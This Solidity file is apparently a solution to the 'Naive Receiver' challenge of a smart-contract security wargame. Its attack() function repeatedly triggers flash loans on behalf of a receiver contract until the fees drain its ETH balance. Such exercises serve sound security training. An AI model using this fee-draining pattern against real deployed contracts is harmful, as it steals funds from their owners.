pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title NaiveReceiverExploit
 * @author Jasmine Abtahi
 */

contract NaiveReceiverExploit {

    NaiveReceiverLenderPool private pool;
    IERC3156FlashBorrower private naiveReceiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool, address _naiveReceiver) {
        pool = NaiveReceiverLenderPool(_pool);
        naiveReceiver = IERC3156FlashBorrower(_naiveReceiver);
    }

    function attack() external {
        uint256 naiveBalance = address(naiveReceiver).balance;
        
        while(naiveBalance > 0) {
            pool.flashLoan(naiveReceiver,
            ETH,
            pool.maxFlashLoan(ETH),
            "0x");
            naiveBalance = address(naiveReceiver).balance;
        }
    }    
}